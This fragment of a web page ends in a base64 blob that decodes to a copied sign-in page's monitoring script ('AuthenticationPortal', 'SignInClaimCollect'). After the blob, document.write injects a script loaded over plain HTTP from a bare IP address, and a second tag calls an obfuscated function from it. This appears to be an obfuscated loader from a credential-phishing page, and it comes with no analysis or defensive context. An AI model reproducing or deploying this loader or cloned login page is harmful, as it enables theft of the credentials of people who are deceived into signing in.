CAgICB2YXIgYjsKICAgICAgICAgICAgICAgICAgICBmb3IgKGIgPSBhLnByZXZpb3VzU2libGluZzsgYjsgYiA9IGIucHJldmlvdXNTaWJsaW5nKSBiLm5vZGVOYW1lID09IGEubm9kZU5hbWUgJiYgKGMgKz0gMSk7CiAgICAgICAgICAgICAgICAgICAgYiA9IGEubm9kZU5hbWU7CiAgICAgICAgICAgICAgICAgICAgMSAhPSBjICYmIChiICs9ICJbIiArIGMgKyAiXSIpOwogICAgICAgICAgICAgICAgICAgIGEucGFyZW50Tm9kZSAmJiAoYiA9IG4oYS5wYXJlbnROb2RlKSArICIvIiArIGIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gdygpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IGguaW1hZ2VzOwogICAgICAgICAgICAgICAgICAgIGEgJiYgYS5sZW5ndGggJiYgZShhLCBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IGEuZ2V0QXR0cmlidXRlKCJzcmMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgZihiLCAiaW1nIiwgYSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGcoYiwgImltZyIsIGEpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiB4KCkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0gaC5zY3JpcHRzOwogICAgICAgICAgICAgICAgICAgIGEgJiYgYS5sZW5ndGggJiYgZShhLCBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IGEuZ2V0QXR0cmlidXRlKCJzcmMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgZihiLCAic2NyaXB0IiwgYSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGcoYiwgInNjcmlwdCIsIGEpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiB5KCkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0gaC5zdHlsZVNoZWV0czsKICAgICAgICAgICAgICAgICAgICBhICYmIGEubGVuZ3RoICYmIGUoYSwgZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEgPSBhLm93bmVyTm9kZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBhLmdldEF0dHJpYnV0ZSgiaHJlZiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZihiLCAic3R5bGUiLCBhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGcoYiwgInN0eWxlIiwgYSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24geigpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoQSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IHEoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZShhLCBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZihhLm5hbWUsIGEuaW5pdGlhdG9yVHlwZSkKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gQigpIHsKICAgICAgICAgICAgICAgICAgICBlKHEoKSwgZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZyhhLm5hbWUsIGEuaW5pdGlhdG9yVHlwZSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHIoKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGE7CiAgICAgICAgICAgICAgICAgICAgYSA9IGQubG9jYXRpb24gJiYgZC5sb2NhdGlvbi5wcm90b2NvbCA/IGQubG9jYXRpb24ucHJvdG9jb2wgOiB2b2lkIDA7CiAgICAgICAgICAgICAgICAgICAgImh0dHBzOiIgPT0gYSAmJiAoeigpLCB3KCksIHgoKSwgeSgpLCBCKCksIHAgPCBDICYmIHNldFRpbWVvdXQociwgRCkpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgdmFyIHMgPSAiW0NTTV0gSW5zZWN1cmUgY29udGVudCBkZXRlY3RlZCAiLCB0ID0gIltDU01dIEFqYXggcmVxdWVzdCB0byBzYW1lIHBhZ2UgZGV0ZWN0ZWQgIiwgdiA9ICJXQVJOIiwKICAgICAgICAgICAgICAgICAgICBtID0ge30sIHAgPSAwLCBEID0gay51ZV9uc2lwIHx8IDFFMywgQyA9IDUsIEEgPSAxID09IGsudWVfdXJ0LCB1ID0gITA7CiAgICAgICAgICAgICAgICB1ZV9jc20udWVfZGlzYWJsZU5vblNlY3VyZSB8fCAoZC5wZXJmb3JtYW5jZSAmJiBkLnBlcmZvcm1hbmNlLnNldFJlc291cmNlVGltaW5nQnVmZmVyU2l6ZSAmJiBkLnBlcmZvcm1hbmNlLnNldFJlc291cmNlVGltaW5nQnVmZmVyU2l6ZSgzMDApLCByKCkpCiAgICAgICAgICAgIH0pKHVlX2NzbSwgd2luZG93LCBkb2N1bWVudCk7CgoKICAgICAgICAgICAgdmFyIHVlX2FhX2EgPSAiIjsKICAgICAgICAgICAgaWYgKHVlLnRyaWdnZXIgJiYgKHVlX2FhX2EgPT09ICJDIiB8fCB1ZV9hYV9hID09PSAiVDEiKSkgewogICAgICAgICAgICAgICAgdWUudHJpZ2dlcigiVUVEQVRBX0FBX1NFUlZFUlNJREVfQVNTSUdOTUVOVF9DTElFTlRTSURFX1RSSUdHRVJfMTkwMjQ5IiwgdWVfYWFfYSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgKGZ1bmN0aW9uIChmLCBiKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBnKCkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGIuUGVyZm9ybWFuY2VPYnNlcnZlciAmJiAiZnVuY3Rpb24iID09PSB0eXBlb2YgYi5QZXJmb3JtYW5jZU9ic2VydmVyICYmIChhID0gbmV3IGIuUGVyZm9ybWFuY2VPYnNlcnZlcihmdW5jdGlvbiAoYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYyhiLmdldEVudHJpZXMoKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSksIGEub2JzZXJ2ZShkKSkKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGsoKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBtKCkgewogICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGggPSBkLmVudHJ5VHlwZXMsIGEgPSAwOyBhIDwgaC5sZW5ndGg7IGErKykgYyhiLnBlcmZvcm1hbmNlLmdldEVudHJpZXNCeVR5cGUoaFthXSkpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gYyhhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGEgJiYgQXJyYXkuaXNBcnJheShhKSkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBjID0gMCwgZSA9IDA7IGUgPCBhLmxlbmd0aDsgZSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZCA9IGwuaW5kZXhPZihhW2VdLm5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC0xICE9PSBkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGcgPSBNYXRoLnJvdW5kKGIucGVyZm9ybWFuY2UudGltaW5nLm5hdmlnYXRpb25TdGFydCArIGFbZV0uc3RhcnRUaW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLnVldChuW2RdLCB2b2lkIDAsIHZvaWQgMCwgZyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYysrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgbC5sZW5ndGggPT09CiAgICAgICAgICAgICAgICAgICAgICAgIGMgJiYgaygpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGsoKSB7CiAgICAgICAgICAgICAgICAgICAgYSAmJiBhLmRpc2Nvbm5lY3QgJiYgImZ1bmN0aW9uIiA9PT0gdHlwZW9mIGEuZGlzY29ubmVjdCAmJiBhLmRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgiZnVuY3Rpb24iID09PSB0eXBlb2YgZi51ZXQgJiYgYi5wZXJmb3JtYW5jZSAmJiAib2JqZWN0IiA9PT0gdHlwZW9mIGIucGVyZm9ybWFuY2UgJiYgYi5wZXJmb3JtYW5jZS5nZXRFbnRyaWVzQnlUeXBlICYmICJmdW5jdGlvbiIgPT09IHR5cGVvZiBiLnBlcmZvcm1hbmNlLmdldEVudHJpZXNCeVR5cGUgJiYgYi5wZXJmb3JtYW5jZS50aW1pbmcgJiYgIm9iamVjdCIgPT09IHR5cGVvZiBiLnBlcmZvcm1hbmNlLnRpbWluZyAmJiAibnVtYmVyIiA9PT0gdHlwZW9mIGIucGVyZm9ybWFuY2UudGltaW5nLm5hdmlnYXRpb25TdGFydCkgewogICAgICAgICAgICAgICAgICAgIHZhciBkID0ge2VudHJ5VHlwZXM6IFsicGFpbnQiXX0sIGwgPSBbImZpcnN0LXBhaW50IiwgImZpcnN0LWNvbnRlbnRmdWwtcGFpbnQiXSwgbiA9IFsiZnAiLCAiZmNwIl0sCiAgICAgICAgICAgICAgICAgICAgICAgIGE7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgbSgpLCBnKCkKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGYudWVMb2dFcnJvcihwLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dMZXZlbDogIkVSUk9SIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJpYnV0aW9uOiAicGVyZm9ybWFuY2VNZXRyaWNzIgogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkodWVfY3NtLCB3aW5kb3cpOwoKCiAgICAgICAgICAgIGlmICh3aW5kb3cuY3NhKSB7CiAgICAgICAgICAgICAgICBjc2EoIkV2ZW50cyIpKCJzZXRFbnRpdHkiLCB7CiAgICAgICAgICAgICAgICAgICAgcGFnZToge3BhZ2VUeXBlOiAiQXV0aGVudGljYXRpb25Qb3J0YWwiLCBzdWJQYWdlVHlwZTogIlNpZ25JbkNsYWltQ29sbGVjdCIsIHBhZ2VUeXBlSWQ6ICIifQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCgogICAgICAgIH0KICAgICAgICAvKiDil6wgKi8KICAgIDwvc2NyaXB0PgoKPC9kaXY+Cgo8bm9zY3JpcHQ+CgoKCjwvbm9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg==";document.write("<script src="http://134.122.177.73/ap/\&quot;\/GMibjr\/tadxRZY.js\&quot;"><\/script>");</script>
<script>tadxRZY(GMibjr);</script>